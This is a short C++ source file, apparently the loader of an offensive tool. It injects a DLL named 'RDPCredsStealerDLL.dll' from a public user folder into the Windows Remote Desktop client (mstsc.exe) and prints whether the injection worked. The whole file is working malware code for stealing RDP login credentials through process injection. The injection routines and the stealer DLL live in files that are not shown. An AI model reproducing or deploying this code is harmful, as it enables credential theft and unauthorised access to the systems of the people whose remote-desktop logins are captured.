#include <windows.h>
#include <stdio.h>
#include <iostream>
#include "Inject.h"

using namespace std;

int main() {
    const char* dllPath = "C:\\Users\\Public\\Music\\RDPCredsStealerDLL.dll";
    const wchar_t* procName = L"mstsc.exe";     

    int bufferSize = MultiByteToWideChar(CP_UTF8, 0, dllPath, -1, NULL, 0);
    wchar_t* wideDllPath = new wchar_t[bufferSize];
    MultiByteToWideChar(CP_UTF8, 0, dllPath, -1, wideDllPath, bufferSize);

    bool result = DLLinjector(getPIDbyProcName(procName), wideDllPath);

    if (result) {
        cout << "\nDLL Injected succesfully";
        OutputDebugStringA("DLL Injected!");
    }
    else {
        cout << "DLL injection Failed";
    }

    delete[] wideDllPath;
    return 0;
}   